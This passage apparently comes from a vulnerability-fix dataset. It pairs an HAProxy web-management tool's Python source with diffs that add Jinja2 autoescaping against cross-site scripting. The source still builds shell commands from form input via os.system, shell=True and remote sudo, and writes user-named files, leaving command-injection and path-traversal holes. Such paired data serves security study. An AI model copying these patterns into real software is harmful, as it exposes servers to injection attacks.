\ttmp_file=sql.get_setting('tmp_config_path') +\"/\" +get_data('config') +\".cfg\" \terror=\"\" \t \ttry: \t\tos.system(\"dos2unix \"+cfg) \texcept OSError: \t\treturn 'Please install dos2unix' \t\tpass \t \tif kwargs.get(\"keepalived\")==1: \t\tif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo mv -f \" +tmp_file +\" /etc/keepalived/keepalived.conf\"] \t\telse: \t\t\tcommands=[ \"sudo mv -f \" +tmp_file +\" /etc/keepalived/keepalived.conf && sudo systemctl restart keepalived\"] \telse: \t\tif kwargs.get(\"just_save\")==\"test\": \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo rm -f \" +tmp_file] \t\telif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path')] \t\telse: \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path') +\" && sudo \" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting('firewall_enable')==\"1\": \t\t\tcommands.extend(open_port_firewalld(cfg)) \t \terror +=str(upload(serv, tmp_file, cfg, dir='fullpath')) \ttry: \t\terror +=ssh_command(serv, commands) \texcept Exception as e: \t\terror +=e \tif error: \t\treturn error \t\t def open_port_firewalld(cfg): \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read export config file</div>') \t \tfirewalld_commands=[] \t \tfor line in conf: \t\tif \"bind\" in line: \t\t\tbind=line.split(\":\") \t\t\tbind[1]=bind[1].strip(' ') \t\t\tbind=bind[1].split(\"ssl\") \t\t\tbind=bind[0].strip(' \\t\\n\\r') \t\t\tfirewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent' % bind) \t\t\t\t \tfirewalld_commands.append('sudo firewall-cmd --reload') \treturn firewalld_commands \t def check_haproxy_config(serv): \timport sql \tcommands=[ \"haproxy -q -c -f %s\" % sql.get_setting('haproxy_config_path')] \tssh=ssh_connect(serv) \tfor command in commands: \t\tstdin, stdout, stderr=ssh.exec_command(command, get_pty=True) \t\tif not stderr.read(): \t\t\treturn True \t\telse: \t\t\treturn False \tssh.close() \t\t def show_log(stdout): \ti=0 \tfor line in stdout: \t\ti=i +1 \t\tline_class=\"line3\" if i % 2==0 else \"line\" \t\tprint('<div class=\"'+line_class+'\">' +escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line in stdout: \t\tprint(line) \t\t def server_status(stdout):\t \tproc_count=\"\" \t \tfor line in stdout: \t\tif \"Ncat: \" not in line: \t\t\tfor k in line: \t\t\t\tproc_count=k.split(\":\")[1] \t\telse: \t\t\tproc_count=0 \treturn proc_count\t\t def ssh_command(serv, commands, **kwargs): \tssh=ssh_connect(serv) \t\t \tfor command in commands: \t\ttry: \t\t\tstdin, stdout, stderr=ssh.exec_command(command, get_pty=True) \t\texcept: \t\t\tcontinue \t\t\t\t \t\tif kwargs.get(\"ip\")==\"1\": \t\t\tshow_ip(stdout) \t\telif kwargs.get(\"show_log\")==\"1\": \t\t\tshow_log(stdout) \t\telif kwargs.get(\"server_status\")==\"1\": \t\t\tserver_status(stdout) \t\telif kwargs.get('print_out'): \t\t\tprint(stdout.read().decode(encoding='UTF-8')) \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\telif kwargs.get('retunr_err')==1: \t\t\treturn stderr.read().decode(encoding='UTF-8') \t\telse: \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\t\t \t\tfor line in stderr.read().decode(encoding='UTF-8'): \t\t\tif line: \t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\") \ttry:\t \t\tssh.close() \texcept: \t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"+str(ssh)+\"<a title='Close' id='errorMess'><b>X</b></a></div>\") \t\tpass def escape_html(text): \treturn cgi.escape(text, quote=True) \t def subprocess_execute(cmd): \timport subprocess \tp=subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True) \tstdout, stderr=p.communicate() \toutput=stdout.splitlines() \t \treturn output, stderr def show_backends(serv, **kwargs): \timport json \timport sql \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tcmd='echo \"show backend\" |nc %s %s' %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tret=\"\" \tfor line in output: \t\tif \" \t\t\tcontinue \t\tif line !=\"\": \t\t\tback=json.dumps(line).split(\"\\\"\") \t\t\tif kwargs.get('ret'): \t\t\t\tret +=back[1] \t\t\t\tret +=\"<br />\" \t\t\telse: \t\t\t\tprint(back[1], end=\"<br>\") \t\t \tif kwargs.get('ret'): \t\treturn ret \t\t def get_files(dir=get_config_var('configs', 'haproxy_save_configs_dir'), format='cfg', **kwargs): \timport glob \tfile=set() \treturn_files=set() \t \tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t \t\tfile.add(files.split('/')[-1]) \tfiles=sorted(file, reverse=True) \tif format=='cfg': \t\tfor file in files: \t\t\tip=file.split(\"-\") \t\t\tif serv==ip[0]: \t\t\t\treturn_files.add(file) \t\treturn sorted(return_files, reverse=True) \telse: \t\treturn files \t def get_key(item): \treturn item[0] ",
                    "sourceWithComments": "# -*- coding: utf-8 -*-\"\nimport cgi\nimport os, sys\n\nform = cgi.FieldStorage()\nserv = form.getvalue('serv')\n\ndef get_app_dir():\n\td = sys.path[0]\n\td = d.split('/')[-1]\t\t\n\treturn sys.path[0] if d == \"app\" else os.path.dirname(sys.path[0])\t\n\ndef get_config_var(sec, var):\n\tfrom configparser import ConfigParser, ExtendedInterpolation\n\ttry:\n\t\tpath_config = get_app_dir()+\"/haproxy-wi.cfg\"\n\t\tconfig = ConfigParser(interpolation=ExtendedInterpolation())\n\t\tconfig.read(path_config)\n\texcept:\n\t\tprint('Content-type: text/html\\n')\n\t\tprint('<center><div class=\"alert alert-danger\">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>')\n\ttry:\n\t\treturn config.get(sec, var)\n\texcept:\n\t\tprint('Content-type: text/html\\n')\n\t\tprint('<center><div class=\"alert alert-danger\">Check the config file. Presence section %s and parameter %s</div>' % (sec, var))\n\t\t\t\t\t\ndef get_data(type):\n\tfrom datetime import datetime\n\tfrom pytz import timezone\n\timport sql\n\tnow_utc = datetime.now(timezone(sql.get_setting('time_zone')))\n\tif type == 'config':\n\t\tfmt = \"%Y-%m-%d.%H:%M:%S\"\n\tif type == 'logs':\n\t\tfmt = '%Y%m%d'\n\tif type == \"date_in_log\":\n\t\tfmt = \"%b %d %H:%M:%S\"\n\t\t\n\treturn now_utc.strftime(fmt)\n\t\t\t\ndef logging(serv, action, **kwargs):\n\timport sql\n\timport http.cookies\n\tlog_path = get_config_var('main', 'log_path')\n\tlogin = ''\n\t\n\tif not os.path.exists(log_path):\n\t\tos.makedirs(log_path)\n\t\t\n\ttry:\n\t\tIP = cgi.escape(os.environ[\"REMOTE_ADDR\"])\n\t\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\t\tuser_uuid = cookie.get('uuid')\n\t\tlogin = sql.get_user_name_by_uuid(user_uuid.value)\n\texcept:\n\t\tpass\n\t\t\n\tif kwargs.get('alerting') == 1:\n\t\tmess = get_data('date_in_log') + action + \"\\n\"\n\t\tlog = open(log_path + \"/checker-\"+get_data('logs')+\".log\", \"a\")\n\telif kwargs.get('metrics') == 1:\n\t\tmess = get_data('date_in_log') + action + \"\\n\"\n\t\tlog = open(log_path + \"/metrics-\"+get_data('logs')+\".log\", \"a\")\n\telif kwargs.get('keep_alive') == 1:\n\t\tmess = get_data('date_in_log') + action + \"\\n\"\n\t\tlog = open(log_path + \"/keep_alive-\"+get_data('logs')+\".log\", \"a\")\n\telse:\n\t\tmess = get_data('date_in_log') + \" from \" + IP + \" user: \" + login + \" \" + action + \" for: \" + serv + \"\\n\"\n\t\tlog = open(log_path + \"/config_edit-\"+get_data('logs')+\".log\", \"a\")\n\ttry:\t\n\t\tlog.write(mess)\n\t\tlog.close\n\texcept IOError as e:\n\t\tprint('<center><div class=\"alert alert-danger\">Can\\'t write log. Please check log_path in config %e</div></center>' % e)\n\t\tpass\n\t\ndef telegram_send_mess(mess, **kwargs):\n\timport telebot\n\tfrom telebot import apihelper\n\timport sql\n\t\n\ttelegrams = sql.get_telegram_by_ip(kwargs.get('ip'))\n\tproxy = sql.get_setting('proxy')\n\t\n\tfor telegram in telegrams:\n\t\ttoken_bot = telegram[1]\n\t\tchannel_name = telegram[2]\n\t\t\t\n\tif proxy is not None:\n\t\tapihelper.proxy = {'https': proxy}\n\ttry:\n\t\tbot = telebot.TeleBot(token=token_bot)\n\t\tbot.send_message(chat_id=channel_name, text=mess)\n\texcept:\n\t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group\")\n\t\tsys.exit()\n\t\ndef check_login(**kwargs):\n\timport sql\n\timport http.cookies\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_uuid = cookie.get('uuid')\n\tref = os.environ.get(\"SCRIPT_NAME\")\n\n\tsql.delete_old_uuid()\n\t\n\tif user_uuid is not None:\n\t\tsql.update_last_act_user(user_uuid.value)\n\t\tif sql.get_user_name_by_uuid(user_uuid.value) is None:\n\t\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref)\n\telse:\n\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref)\n\t\t\t\t\ndef is_admin(**kwargs):\n\timport sql\n\timport http.cookies\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\n\ttry:\n\t\trole = sql.get_user_role_by_uuid(user_id.value)\n\texcept:\n\t\trole = 3\n\t\tpass\n\tlevel = kwargs.get(\"level\")\n\t\t\n\tif level is None:\n\t\tlevel = 1\n\t\t\n\ttry:\n\t\treturn True if role <= level else False\n\texcept:\n\t\treturn False\n\t\tpass\n\ndef page_for_admin(**kwargs):\n\tgive_level = 1\n\tgive_level = kwargs.get(\"level\")\n\t\t\n\tif not is_admin(level = give_level):\n\t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>')\n\t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">')\n\t\timport sys\n\t\tsys.exit()\n\t\t\t\t\ndef ssh_connect(serv, **kwargs):\n\timport paramiko\n\tfrom paramiko import SSHClient\n\timport sql\n\tfullpath = get_config_var('main', 'fullpath')\n\tssh_enable = ''\n\tssh_port = ''\n\tssh_user_name = ''\n\tssh_user_password = ''\n\t\n\tfor sshs in sql.select_ssh(serv=serv):\n\t\tssh_enable = sshs[3]\n\t\tssh_user_name = sshs[4]\n\t\tssh_user_password = sshs[5]\n\t\tssh_key_name = fullpath+'/keys/%s.pem' % sshs[2]\n\n\tservers = sql.select_servers(server=serv)\n\tfor server in servers:\n\t\tssh_port = server[10]\n\n\tssh = SSHClient()\n\tssh.load_system_host_keys()\n\tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\ttry:\n\t\tif ssh_enable == 1:\n\t\t\tk = paramiko.RSAKey.from_private_key_file(ssh_key_name)\n\t\t\tssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, pkey = k)\n\t\telse:\n\t\t\tssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, password = ssh_user_password)\n\t\treturn ssh\n\texcept paramiko.AuthenticationException:\n\t\treturn 'Authentication failed, please verify your credentials'\n\t\tpass\n\texcept paramiko.SSHException as sshException:\n\t\treturn 'Unable to establish SSH connection: %s ' % sshException\n\t\tpass\n\texcept paramiko.BadHostKeyException as badHostKeyException:\n\t\treturn 'Unable to verify server\\'s host key: %s ' % badHostKeyException\n\t\tpass\n\texcept Exception as e:\n\t\tif e == \"No such file or directory\":\n\t\t\treturn '%s. Check ssh key' % e\n\t\t\tpass\n\t\telif e == \"Invalid argument\":\n\t\t\terror = 'Check the IP of the server'\n\t\t\tpass\n\t\telse:\n\t\t\terror = e\t\n\t\t\tpass\n\t\treturn str(error)\n\ndef get_config(serv, cfg, **kwargs):\n\timport sql\n\n\tconfig_path = \"/etc/keepalived/keepalived.conf\" if kwargs.get(\"keepalived\") else sql.get_setting('haproxy_config_path')\t\n\tssh = ssh_connect(serv)\n\ttry:\n\t\tsftp = ssh.open_sftp()\n\t\tsftp.get(config_path, cfg)\n\t\tsftp.close()\n\t\tssh.close()\n\texcept Exception as e:\n\t\tssh = str(e)\n\t\treturn ssh\n\t\ndef diff_config(oldcfg, cfg):\n\tlog_path = get_config_var('main', 'log_path')\n\tdiff = \"\"\n\tdate = get_data('date_in_log') \n\tcmd=\"/bin/diff -ub %s %s\" % (oldcfg, cfg)\n\t\n\toutput, stderr = subprocess_execute(cmd)\n\t\n\tfor line in output:\n\t\tdiff += date + \" \" + line + \"\\n\"\n\ttry:\t\t\n\t\tlog = open(log_path + \"/config_edit-\"+get_data('logs')+\".log\", \"a\")\n\t\tlog.write(diff)\n\t\tlog.close\n\texcept IOError:\n\t\tprint('<center><div class=\"alert alert-danger\">Can\\'t read write change to log. %s</div></center>' % stderr)\n\t\tpass\n\t\t\ndef install_haproxy(serv, **kwargs):\n\timport sql\n\tscript = \"install_haproxy.sh\"\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\thaproxy_sock_port = sql.get_setting('haproxy_sock_port')\n\tstats_port = sql.get_setting('stats_port')\n\tserver_state_file = sql.get_setting('server_state_file')\n\tstats_user = sql.get_setting('stats_user')\n\tstats_password = sql.get_setting('stats_password')\n\tproxy = sql.get_setting('proxy')\n\tos.system(\"cp scripts/%s .\" % script)\n\t\n\tproxy_serv = proxy if proxy is not None else \"\"\n\t\t\n\tcommands = [ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" + proxy_serv+ \n\t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+\n\t\t\t\t\" STATS_USER=\"+stats_user+\" STATS_PASS=\"+stats_password ]\n\t\n\terror = str(upload(serv, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\t\t\n\tos.system(\"rm -f %s\" % script)\n\tssh_command(serv, commands, print_out=\"1\")\n\t\n\tif kwargs.get('syn_flood') == \"1\":\n\t\tsyn_flood_protect(serv)\n\t\ndef syn_flood_protect(serv, **kwargs):\n\timport sql\n\tscript = \"syn_flood_protect.sh\"\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\t\n\tenable = \"disable\" if kwargs.get('enable') == \"0\" else \"disable\"\n\n\tos.system(\"cp scripts/%s .\" % script)\n\t\n\tcommands = [ \"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+ \" \"+enable ]\n\t\n\terror = str(upload(serv, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\tos.system(\"rm -f %s\" % script)\n\tssh_command(serv, commands, print_out=\"1\")\n\t\ndef waf_install(serv, **kwargs):\n\timport sql\n\tscript = \"waf.sh\"\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\tproxy = sql.get_setting('proxy')\n\thaproxy_dir = sql.get_setting('haproxy_dir')\n\tver = check_haproxy_version(serv)\n\n\tos.system(\"cp scripts/%s .\" % script)\n\t\n\tcommands = [ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" + proxy+ \n\t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver ]\n\t\n\terror = str(upload(serv, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\tos.system(\"rm -f %s\" % script)\n\t\n\tstderr = ssh_command(serv, commands, print_out=\"1\")\n\tif stderr is None:\n\t\tsql.insert_waf_metrics_enable(serv, \"0\")\n\ndef check_haproxy_version(serv):\n\timport sql\n\thaproxy_sock_port = sql.get_setting('haproxy_sock_port')\n\tver = \"\"\n\tcmd=\"echo 'show info' |nc %s %s |grep Version |awk '{print $2}'\" % (serv, haproxy_sock_port)\n\toutput, stderr = subprocess_execute(cmd)\n\tfor line in output:\n\t\tver = line\n\treturn ver\n\t\ndef upload(serv, path, file, **kwargs):\n\terror = \"\"\n\tfull_path = path + file\n\n\tif kwargs.get('dir') == \"fullpath\":\n\t\tfull_path = path\n\t\n\ttry:\n\t\tssh = ssh_connect(serv)\n\texcept Exception as e:\n\t\terror = e\n\t\tpass\n\ttry:\n\t\tsftp = ssh.open_sftp()\n\t\tfile = sftp.put(file, full_path)\n\t\tsftp.close()\n\t\tssh.close()\n\texcept Exception as e:\n\t\terror = e\n\t\tpass\n\t\t\n\treturn error\n\t\ndef upload_and_restart(serv, cfg, **kwargs):\n\timport sql\n\ttmp_file = sql.get_setting('tmp_config_path') + \"/\" + get_data('config') + \".cfg\"\n\terror = \"\"\n\t\n\ttry:\n\t\tos.system(\"dos2unix \"+cfg)\n\texcept OSError:\n\t\treturn 'Please install dos2unix' \n\t\tpass\n\t\n\tif kwargs.get(\"keepalived\") == 1:\n\t\tif kwargs.get(\"just_save\") == \"save\":\n\t\t\tcommands = [ \"sudo mv -f \" + tmp_file + \" /etc/keepalived/keepalived.conf\" ]\n\t\telse:\n\t\t\tcommands = [ \"sudo mv -f \" + tmp_file + \" /etc/keepalived/keepalived.conf && sudo systemctl restart keepalived\" ]\n\telse:\n\t\tif kwargs.get(\"just_save\") == \"test\":\n\t\t\tcommands = [ \"sudo haproxy  -q -c -f \" + tmp_file + \"&& sudo rm -f \" + tmp_file ]\n\t\telif kwargs.get(\"just_save\") == \"save\":\n\t\t\tcommands = [ \"sudo haproxy  -q -c -f \" + tmp_file + \"&& sudo mv -f \" + tmp_file + \" \" + sql.get_setting('haproxy_config_path') ]\n\t\telse:\n\t\t\tcommands = [ \"sudo haproxy  -q -c -f \" + tmp_file + \"&& sudo mv -f \" + tmp_file + \" \" + sql.get_setting('haproxy_config_path') + \" && sudo \" + sql.get_setting('restart_command') ]\t\n\t\tif sql.get_setting('firewall_enable') == \"1\":\n\t\t\tcommands.extend(open_port_firewalld(cfg))\n\t\n\terror += str(upload(serv, tmp_file, cfg, dir='fullpath'))\n\n\ttry:\n\t\terror += ssh_command(serv, commands)\n\texcept Exception as e:\n\t\terror += e\n\tif error:\n\t\treturn error\n\t\t\ndef open_port_firewalld(cfg):\n\ttry:\n\t\tconf = open(cfg, \"r\")\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t read export config file</div>')\n\t\n\tfirewalld_commands = []\n\t\n\tfor line in conf:\n\t\tif \"bind\" in line:\n\t\t\tbind = line.split(\":\")\n\t\t\tbind[1] = bind[1].strip(' ')\n\t\t\tbind = bind[1].split(\"ssl\")\n\t\t\tbind = bind[0].strip(' \\t\\n\\r')\n\t\t\tfirewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent' % bind)\n\t\t\t\t\n\tfirewalld_commands.append('sudo firewall-cmd --reload')\n\treturn firewalld_commands\n\t\ndef check_haproxy_config(serv):\n\timport sql\n\tcommands = [ \"haproxy  -q -c -f %s\" % sql.get_setting('haproxy_config_path') ]\n\tssh = ssh_connect(serv)\n\tfor command in commands:\n\t\tstdin , stdout, stderr = ssh.exec_command(command, get_pty=True)\n\t\tif not stderr.read():\n\t\t\treturn True\n\t\telse:\n\t\t\treturn False\n\tssh.close()\n\t\t\ndef show_log(stdout):\n\ti = 0\n\tfor line in stdout:\n\t\ti = i + 1\n\t\tline_class = \"line3\" if i % 2 == 0 else \"line\"\n\t\tprint('<div class=\"'+line_class+'\">' + escape_html(line) + '</div>')\n\t\t\t\ndef show_ip(stdout):\n\tfor line in stdout:\n\t\tprint(line)\n\t\t\ndef server_status(stdout):\t\n\tproc_count = \"\"\n\t\n\tfor line in stdout:\n\t\tif \"Ncat: \" not in line:\n\t\t\tfor k in line:\n\t\t\t\tproc_count = k.split(\":\")[1]\n\t\telse:\n\t\t\tproc_count = 0\n\treturn proc_count\t\t\n\ndef ssh_command(serv, commands, **kwargs):\n\tssh = ssh_connect(serv)\n\t\t  \n\tfor command in commands:\n\t\ttry:\n\t\t\tstdin, stdout, stderr = ssh.exec_command(command, get_pty=True)\n\t\texcept:\n\t\t\tcontinue\n\t\t\t\t\n\t\tif kwargs.get(\"ip\") == \"1\":\n\t\t\tshow_ip(stdout)\n\t\telif kwargs.get(\"show_log\") == \"1\":\n\t\t\tshow_log(stdout)\n\t\telif kwargs.get(\"server_status\") == \"1\":\n\t\t\tserver_status(stdout)\n\t\telif kwargs.get('print_out'):\n\t\t\tprint(stdout.read().decode(encoding='UTF-8'))\n\t\t\treturn stdout.read().decode(encoding='UTF-8')\n\t\telif kwargs.get('retunr_err') == 1:\n\t\t\treturn stderr.read().decode(encoding='UTF-8')\n\t\telse:\n\t\t\treturn stdout.read().decode(encoding='UTF-8')\n\t\t\t\n\t\tfor line in stderr.read().decode(encoding='UTF-8'):\n\t\t\tif line:\n\t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\")\n\ttry:\t\n\t\tssh.close()\n\texcept:\n\t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"+str(ssh)+\"<a title='Close' id='errorMess'><b>X</b></a></div>\")\n\t\tpass\n\ndef escape_html(text):\n\treturn cgi.escape(text, quote=True)\n\t\ndef subprocess_execute(cmd):\n\timport subprocess \n\tp = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)\n\tstdout, stderr = p.communicate()\n\toutput = stdout.splitlines()\n\t\n\treturn output, stderr\n\ndef show_backends(serv, **kwargs):\n\timport json\n\timport sql\n\thaproxy_sock_port = sql.get_setting('haproxy_sock_port')\n\tcmd='echo \"show backend\" |nc %s %s' % (serv, haproxy_sock_port)\n\toutput, stderr = subprocess_execute(cmd)\n\tret = \"\"\n\tfor line in output:\n\t\tif \"#\" in  line or \"stats\" in line:\n\t\t\tcontinue\n\t\tif line != \"\":\n\t\t\tback = json.dumps(line).split(\"\\\"\")\n\t\t\tif kwargs.get('ret'):\n\t\t\t\tret += back[1]\n\t\t\t\tret += \"<br />\"\n\t\t\telse:\n\t\t\t\tprint(back[1], end=\"<br>\")\n\t\t\n\tif kwargs.get('ret'):\n\t\treturn ret\n\t\t\ndef get_files(dir = get_config_var('configs', 'haproxy_save_configs_dir'), format = 'cfg', **kwargs):\n\timport glob\n\tfile = set()\n\treturn_files = set()\n\t\n\tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t\n\t\tfile.add(files.split('/')[-1])\n\tfiles = sorted(file, reverse=True)\n\n\tif format == 'cfg':\n\t\tfor file in files:\n\t\t\tip = file.split(\"-\")\n\t\t\tif serv == ip[0]:\n\t\t\t\treturn_files.add(file)\n\t\treturn sorted(return_files, reverse=True)\n\telse: \n\t\treturn files\n\t\ndef get_key(item):\n\treturn item[0]"
                },
                "/app/options.py": {
                    "changes": [
                        {
                            "diff": "\n if act == \"showCompareConfigs\":\n \timport glob\n \tfrom jinja2 import Environment, FileSystemLoader\n-\tenv = Environment(loader=FileSystemLoader('templates/ajax'))\n+\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True)\n \ttemplate = env.get_template('/show_compare_configs.html')\n \tleft = form.getvalue('left')\n \tright = form.getvalue('right')\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/app/options.py",
                            "badparts": [
                                "\tenv = Environment(loader=FileSystemLoader('templates/ajax'))"
                            ],
                            "goodparts": [
                                "\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True)"
                            ]
                        },
                        {
                            "diff": "\n \thap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n \tcmd='diff -ub %s%s %s%s' % (hap_configs_dir, left, hap_configs_dir, right)\t\n-\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])\n+\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])\n \ttemplate = env.get_template('compare.html')\n \t\n \toutput, stderr = funct.subprocess_execute(cmd)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/app/options.py",
                            "badparts": [
                                "\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])"
                            ],
                            "goodparts": [
                                "\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])"
                            ]
                        },
                        {
                            "diff": "\n \ttry:\n \t\tconf = open(cfg, \"r\")\n+\t\t#conf = conf.read()\n+\t\t#conf = funct.escape_html(conf)\n \texcept IOError:\n \t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>')\n \t\t\n \tfrom jinja2 import Environment, FileSystemLoader\n-\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols'])\n+\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols'])\n \ttemplate = env.get_template('config_show.html')\n \t\n \ttemplate = template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))\t\t\t\t\t\t\t\t\t",
                            "add": 3,
                            "remove": 1,
                            "filename": "/app/options.py",
                            "badparts": [
                                "\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols'])"
                            ],
                            "goodparts": [
                                "\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols'])"
                            ]
                        }
                    ],
                    "source": "\n import cgi import os, sys import funct import sql import ovw form=cgi.FieldStorage() serv=form.getvalue('serv') act=form.getvalue('act') \t print('Content-type: text/html\\n') if act==\"checkrestart\": \tservers=sql.get_dick_permit(ip=serv) \tfor server in servers: \t\tif server !=\"\": \t\t\tprint(\"ok\") \t\t\tsys.exit() \tsys.exit() if form.getvalue('token') is None: \tprint(\"What the fuck?! U r hacker Oo?!\") \tsys.exit() \t\t if form.getvalue('getcerts') is not None and serv is not None: \tcert_path=sql.get_setting('cert_path') \tcommands=[ \"ls -1t \"+cert_path+\" |grep pem\"] \ttry: \t\tfunct.ssh_command(serv, commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') if form.getvalue('checkSshConnect') is not None and serv is not None: \ttry: \t\tfunct.ssh_command(serv,[\"ls -1t\"]) \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('getcert') is not None and serv is not None: \tid=form.getvalue('getcert') \tcert_path=sql.get_setting('cert_path') \tcommands=[ \"cat \"+cert_path+\"/\"+id] \ttry: \t\tfunct.ssh_command(serv, commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('ssh_cert'): \tname=form.getvalue('name') \t \tif not os.path.exists(os.getcwd()+'/keys/'): \t\tos.makedirs(os.getcwd()+'/keys/') \t \tssh_keys=os.path.dirname(os.getcwd())+'/keys/'+name+'.pem' \t \ttry: \t\twith open(ssh_keys, \"w\") as conf: \t\t\tconf.write(form.getvalue('ssh_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">Ssh key was save into: %s </div>' % ssh_keys) \ttry: \t\tfunct.logging(\"local\", \"users.py \texcept: \t\tpass \t\t\t if serv and form.getvalue('ssl_cert'): \tcert_local_dir=funct.get_config_var('main', 'cert_local_dir') \tcert_path=sql.get_setting('cert_path') \t \tif not os.path.exists(cert_local_dir): \t\tos.makedirs(cert_local_dir) \t \tif form.getvalue('ssl_name') is None: \t\tprint('<div class=\"alert alert-danger\">Please enter desired name</div>') \telse: \t\tname=form.getvalue('ssl_name') +'.pem' \t \ttry: \t\twith open(name, \"w\") as ssl_cert: \t\t\tssl_cert.write(form.getvalue('ssl_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s </div>' %(serv, cert_path)) \t\t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload(master[0], cert_path, name) \ttry: \t\tfunct.upload(serv, cert_path, name) \texcept: \t\tpass \t \tos.system(\"mv %s %s\" %(name, cert_local_dir)) \tfunct.logging(serv, \"add.py \t if form.getvalue('backend') is not None: \tfunct.show_backends(serv) \t if form.getvalue('ip') is not None and serv is not None: \tcommands=[ \"sudo ip a |grep inet |egrep -v '::1' |awk '{ print $2 }' |awk -F'/' '{ print $1 }'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('showif'): \tcommands=[\"sudo ip link|grep 'UP' | awk '{print $2}' |awk -F':' '{print $1}'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('action_hap') is not None and serv is not None: \taction=form.getvalue('action_hap') \t \tif funct.check_haproxy_config(serv): \t\tcommands=[ \"sudo systemctl %s haproxy\" % action] \t\tfunct.ssh_command(serv, commands)\t\t 